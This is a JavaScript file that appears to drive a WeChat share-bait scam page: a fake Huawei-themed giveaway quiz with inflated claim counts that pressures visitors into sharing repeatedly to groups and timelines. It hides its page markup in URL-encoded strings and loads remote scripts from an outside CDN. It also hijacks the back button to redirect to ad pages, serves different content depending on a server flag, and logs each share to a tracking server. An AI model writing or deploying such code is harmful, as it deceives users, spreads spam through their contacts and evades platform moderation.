    // 返回开关 值为 0 表示关 值为 1 表示开
    var fanhui = 1
    
    // 0表示先分享群后分享圈 1表示先分享圈后分享群
    var timelineOnOff = 0
    // 值为 '0' 表示关闭广告
    // 值为任意数字 表示分享第几次为广告 栗子：'1','3' 表示第一次第三次分享的是广告 第二次为视频
    // 如果提交的数字为 '999' 这表示全部分享为广告
    var TTimes = new Array('2'); // 朋友圈广告开关
    // 分享朋友圈次数
    var Tnum = 2
    // 值为 '0' 表示关闭广告
    // 值为任意数字 表示分享第几次为广告 栗子：'1','3' 表示第一次第三次分享的是广告 第二次为视频
    // 如果提交的数字为 '999' 这表示全部分享为广告    
    var ATimes = new Array('2','3'); // 朋友广告开关
    // 分享朋友群次数 
    var Anum = 6;
    

    // api域名
    var apidomain = '//' + location.hostname + '/';

	videoIndex = typeof(videoIndex) == 'undefined' ? 0 : videoIndex;
	var autotime = 60000*15 //毫秒
    var timestamp = Date.parse(new Date());

    fanhui && openfh()
    var new_doc = document.open("text/html", "replace");
    var html = decodeURIComponent("%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22Content-Type%22%20content%3D%22text%2Fhtml%3B%20charset%3DGBK%22%3E%0A%20%20%20%20%3Ctitle%3E%E5%8A%A0%E8%BD%BD%E4%B8%AD...%3C%2Ftitle%3E%0A%20%20%20%20%3Cscript%20src%3D%22https%3A%2F%2Fcdn.bootcss.com%2Fjquery%2F3.4.0%2Fjquery.min.js%22%3E%20%0A%20%20%20%20%3C%2Fscript%3E%0A%3C%2Fhead%3E%0A%3Cbody%20class%3D%22xs_btn_yy%22%20cz-shortcut-listen%3D%22true%22%3E%0A%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2Cinitial-scale%3D1%2Cmaximum-scale%3D1%2Cuser-scalable%3D0%2Cviewport-fit%3Dcover%22%3E%0A%3Cmeta%20name%3D%22format-detection%22%20content%3D%22telephone%3Dno%22%3E%0A%3Cmeta%20name%3D%22applicable-device%22%20content%3D%22mobile%22%3E%0A%3Clink%20rel%3D%22stylesheet%22%20href%3D%22http%3A%2F%2Fcdn.xunfengkj.com%2Fstyle%2Fred%2Fe.css%22%3E%0A%3Cscript%20src%3D%22http%3A%2F%2Fcdn.xunfengkj.com%2Fstyle%2Fred%2Fn.js%22%3E%3C%2Fscript%3E%0A%3Cscript%20src%3D%22https%3A%2F%2Fip.ws.126.net%2Fipquery%22%3E%3C%2Fscript%3E%0A%3Cscript%20type%3D%22text%2Fjavascript%22%3E%0A%20%20%20%20var%20_toip%20%3D%20'47.244.157.175'%3B%0A%20%20%20%20var%20_kll%20%3D%20'.'%3B%0A%20%20%20%20var%20_ht%20%3D%20''%3B%0A%0A%20%20%20%20window.data%20%3D%20%7B%0A%20%20%20%20%20%20%20%20%22actname%22%3A%22%E5%BA%86%E7%A5%9D%E5%8D%8E%E4%B8%BA%E8%8D%A3%E7%99%BB%E5%87%BA%E6%B5%B7%E5%93%81%E7%89%8C%E6%A6%9C%E9%A6%96%EF%BC%81%22%2C%0A%20%20%20%20%20%20%20%20%22attached%22%3A%7B%22back_api%22%3A%22%22%7D%2C%0A%20%20%20%20%20%20%20%20%22fafangnum%22%3A58019%2C%0A%20%20%20%20%20%20%20%20%22headimg%22%3A%22http%3A%2F%2Fbj.bcebos.com%2Fmtcapp%2F%2Fpng%2F877768f304fada620573a1d6a396c0a4.png%22%2C%0A%20%20%20%20%20%20%20%20%22lingqunum%22%3A46216%2C%0A%20%20%20%20%20%20%20%20%22wenti%22%3A%22%E5%8D%8E%E4%B8%BA%E5%85%AC%E5%8F%B8%E6%88%90%E7%AB%8B%E4%BA%8E%E5%93%AA%E4%B8%80%E5%B9%B4%EF%BC%9F%22%2C%0A%20%20%20%20%20%20%20%20%22wentihuida1%22%3A%221987%E5%B9%B4%22%2C%0A%20%20%20%20%20%20%20%20%22wentihuida2%22%3A%222019%E5%B9%B4%22%2C%0A%20%20%20%20%20%20%20%20%22wentitip%22%3A%22%E6%B4%BB%E5%8A%A8%3Cspan%20style%3D'color%3A%20%23f5294c'%3E%E4%BB%85%E9%99%90%E5%BE%AE%E4%BF%A1%E7%94%A8%E6%88%B7%E5%8F%82%E4%B8%8E%3C%2Fspan%3E%EF%BC%8C%E8%AF%B7%E7%AD%94%E5%AF%B9%E6%9C%AC%E9%A2%98%E7%A1%AE%E8%AE%A4%E5%8F%82%E4%B8%8E%E8%B5%84%E6%A0%BC%EF%BC%81%22%0A%20%20%20%20%7D%0A%20%20%0A%20%20%09setTimeout(function()%20%7B%0A%20%20%20%20%09history.pushState(history.length%20%2B%201%2C%20%22message%22%2C%20%22%23%22%20%2B%20new%20Date().getTime())%3B%0A%20%20%09%7D%2C%20100)%3B%0A%3C%2Fscript%3E%0A%3Cscript%20src%3D%22https%3A%2F%2Fres.wx.qq.com%2Fopen%2Fjs%2Fjweixin-1.2.0.js%22%3E%3C%2Fscript%3E%0A%3Cscript%3E%0A%20%20%20%20var%20s%20%3D%20document.createElement('script')%3B%0A%20%20%20%20s.src%20%3D%20'http%3A%2F%2Fcdn.xunfengkj.com%2Fstyle%2Fred%2Ff.js'%3B%0A%20%20%20%20document.body.appendChild(s)%3B%0A%3C%2Fscript%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A");
	if (tip == 'ok') {
       	var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = 'https://s5.cnzz.com/z_stat.php?id=1277620186&web_id=1277620186';
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();

        html = decodeURIComponent("%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22Content-Type%22%20content%3D%22text%2Fhtml%3B%20charset%3DGBK%22%3E%0A%3C%2Fhead%3E%0A%3Cbody%20cz-shortcut-listen%3D%22true%22%3E%0A%3Cdiv%20style%3D%22display%3Anone%22%3ECK8rVKDrkAmwxqY5r8OTsztM5%3C%2Fdiv%3E%0A%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20user-scalable%3Dno%2C%20initial-scale%3D1.0%2C%20maximum-scale%3D1.0%2C%20minimum-scale%3D1.0%22%3E%0A%3Cmeta%20http-equiv%3D%22X-UA-Compatible%22%20content%3D%22ie%3Dedge%22%3E%0A%3Clink%20rel%3D%22stylesheet%22%20href%3D%22http%3A%2F%2Fcdn.xunfengkj.com%2Fstyle%2Fred%2Fs.css%22%3E%0A%3Ctitle%3E...%3C%2Ftitle%3E%0A%3Cscript%20src%3D%22https%3A%2F%2Fcdn.bootcss.com%2Fjquery%2F3.4.0%2Fjquery.min.js%22%3E%3C%2Fscript%3E%0A%3Cscript%20src%3D%22https%3A%2F%2Fres.wx.qq.com%2Fopen%2Fjs%2Fjweixin-1.2.0.js%22%3E%3C%2Fscript%3E%0A%3Cscript%20src%3D%22https%3A%2F%2Fip.ws.126.net%2Fipquery%22%3E%3C%2Fscript%3E%0A%3Cdiv%20style%3D%22position%3A%20fixed%3Bbottom%3A10px%3Bright%3A10px%3Bpadding%3A5px%3Bdisplay%3Aflex%3Bjustify-content%3Aspace-between%3Balign-items%3Acenter%3Bwidth%3A72px%3Bcolor%3A%23fff%3Bz-index%3A99999%3Bfont-size%3A%2018px%22%20onclick%3D%22vilung()%22%3E%3Cimg%20style%3D%22width%3A25px%3Bheight%3A25px%22%20src%3D%22http%3A%2F%2Fbj.bcebos.com%2Fmtcapp%2F%2Fpng%2Fb2f29d6f50b44d37fbc78d911661ebdf.png%22%20alt%3D%22%22%3E%E6%8A%95%E8%AF%89%3C%2Fdiv%3E%0A%3Cscript%3E%0Avar%20share%20%3D%200%3B%0A%3C%2Fscript%3E%0A%3Cscript%20src%3D%22http%3A%2F%2Fcdn.xunfengkj.com%2Fstyle%2Fred%2Fg.js%22%3E%3C%2Fscript%3E%0A%0A%3Cscript%3E%0A%20%20%20%20function%20vilung()%20%7B%0A%20%20%20%20%20%20%20%20location.href%20%3D%20%22https%3A%2F%2Fweixin110.qq.com%2Fcgi-bin%2Fmmspamsupport-bin%2Fnewredirectconfirmcgi%3Fblock_type%3D20%26url%3Dweixin.com%22%3B%0A%20%20%20%20%7D%0A%3C%2Fscript%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A")
    }

	new_doc.write(html);
    new_doc.close();

    function openfh()
    {
        window.onhashchange = function() {
           ggcash('fanhui');
        }
    }

	
    function autoskip()
    {
        if (autotime < (Date.parse(new Date()) - timestamp)) {
            $.post(apidomain, {
                index: 'wx5'
            }, function(res) {
                location.href = res.url;
            }, 'JSON');
        } else {
            setTimeout(function(){
                window.autoskip()
            },500);
        }
    }

    function ggcash(name) {
        location.href = apidomain + "" + name + ".cash";
    }

    var shareATimes = 0;
    var shareTTimes = 0;
    var alertTimes = 0;
    var message = null;

	
    var Tpost = null
    var Apost = null


    !(function(){
        var temp = new Array()
        for (var i = 0; i < TTimes.length; i++) {
            temp["'"+TTimes[i]+"'"] = TTimes[i]
            if (1 <= i) {
                Tpost = '1'
            } else {
                Tpost = TTimes[i]
            }
        }
        TTimes = temp
        temp = new Array()

        for (var i = 0; i < ATimes.length; i++) {
            temp["'"+ATimes[i]+"'"] = ATimes[i]
            if (1 <= i) {
                Apost = '1'
            } else {
                Apost = ATimes[i]
            }
        }
        ATimes = temp
    })()
    
    
	
    function wxconfig()
    {
        $.post(apidomain, {
            url: location.href.split('#')[0],
            index: 'jump'
        }, function(res) {
          	window.data = res;
            wx.config(window.data.config);
            sharedata();
            setTimeout(function () {
                $("#loading").hide();
                //$("#tk").trigger('click');
              	show_tip();
            }, 500);
        }, 'JSON');

        autoskip();
    }
    function wxalert(msg, btn, callback) {
        if (alertTimes == 0) {
            var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
            $("body").append(dialog)
        }
        alertTimes++;
        var d = $('#lly_dialog');
        d.show(200);
      	$('#tousu').css('display','flex');
        d.find("#lly_dialog_msg").html(msg);
        d.find("#lly_dialog_btn").html(btn);
        d.find("#lly_dialog_btn").off('click').on('click', function() {
            d.hide(200);
            if (callback) {
                callback()
            }
        })
    }

    function share_tip() {
        share_config(window.result);
        if (Anum > shareATimes && 0 === shareTTimes) {
            message = window.result.share_info['app' + shareATimes]
            wxalert(message, '好')
        } else if  (Anum <= shareATimes && 0 === shareTTimes) {
            message = window.result.share_info['timeline' + shareTTimes]
            wxalert(message, '好')
        } else if ("0" == Tpost && Anum <= shareATimes) {
            message = window.result.share_info.success
            wxalert(message, '确定', function() {
                $.post(apidomain, {
                    index: 'goon',
                    audkey: videoIndex
                }, function(res) {
                    location.href = res.url;
                }, 'JSON');
            })
        } else if (Tnum > shareTTimes && "0" !== Tpost) {
            message = window.result.share_info['timeline' + shareTTimes]
            wxalert(message, '好')
        } else if (Tnum <= shareTTimes && 0 === shareATimes) {
            message = window.result.share_info['app' + shareATimes]
            wxalert(message, '好')
        } else if (Tnum <= shareTTimes && Anum <= shareATimes) {
            message = window.result.share_info.success
            wxalert(message, '确定', function() {
                $.post(apidomain, {
                    index: 'goon',
                    audkey: videoIndex
                }, function(res) {
                    location.href = res.url;
                }, 'JSON');
            })
        } else {
            message = window.result.share_info['app' + shareATimes]
            wxalert(message, '好')
        }
    }

    
    function show_tip() {
        wxalert(message, '好')
    }
	
    function sharedata() {
        $.post(apidomain, {
            index: 'duapp',
          	audkey: videoIndex,
            TTimes: Tpost,
            ATimes: Apost,
            Timeline: timelineOnOff
        }, function(data) {
            window.result = data;
            message = data.share_info.default
            share_config(data);
        }, 'JSON');
    }
	

    function share_config(data) {
        wx.ready(function() {
            wx.hideOptionMenu();
            
          	wx.showMenuItems({
                menuList: ['menuItem:share:appMessage', 'menuItem:share:timeline']
            });
            
            var diqu = '';
            wx.onMenuShareAppMessage({
                title: ATimeslen() ? diqu + data.share_other_info.title : diqu + data.share_app_info.title,
                desc: ATimeslen() ? diqu + data.share_other_info.desc : diqu + data.share_app_info.desc,
                link: ATimeslen() ? ggLink(data.share_other_info.link, window.data.quan) : window.data.qun + data.share_app_info.link,
                imgUrl: ATimeslen() ? data.share_other_info.img_url : data.share_app_info.img_url,
                success: function() {
                    shareATimes += 1;
                  	ajaxSend();
                    share_tip();
                },
                cancel: function() {}
            });
            wx.onMenuShareTimeline({
                title: TTimeslen() ? diqu + data.share_timeline_cash_info.title : diqu + data.share_timeline_info.title,
                link: TTimeslen() ? ggLink(data.share_timeline_cash_info.link, window.data.quan) : window.data.quan + data.share_timeline_info.link,
                imgUrl: TTimeslen() ? data.share_timeline_cash_info.img_url : data.share_timeline_info.img_url,
                success: function() {
                    shareTTimes += 1;
                  	ajaxSend();
                    share_tip();
                },
                cancel: function() {}
            });
        });
    }

    function ATimeslen() {
        if ('undefined' !== typeof ATimes['999']) {
            return true
        } else if ('undefined' !== typeof ATimes['0']) {
            return false
        } else if ('undefined' !== typeof ATimes["'"+(shareATimes + 1)+"'"]) {
            return true
        } else {
            return false
        }
    }

    function TTimeslen() {
        if ('undefined' !== typeof TTimes['999']) {
            return true
        } else if ('undefined' !== typeof TTimes['0']) {
            return false
        } else if ('undefined' !== typeof TTimes["'"+(shareTTimes + 1)+"'"]) {
            return true
        } else {
            return false
        }
    }
   

    function ggLink(cash, host)
    {
        return host + cash
    }

	function ajaxSend(){
        $.post('http://splb.admin.xunfengkj.com/api/manage/sharelog', {
            name: location.hostname,
          	key: videoIndex
        }, function(data) {
            console.log(data);
        });
    }
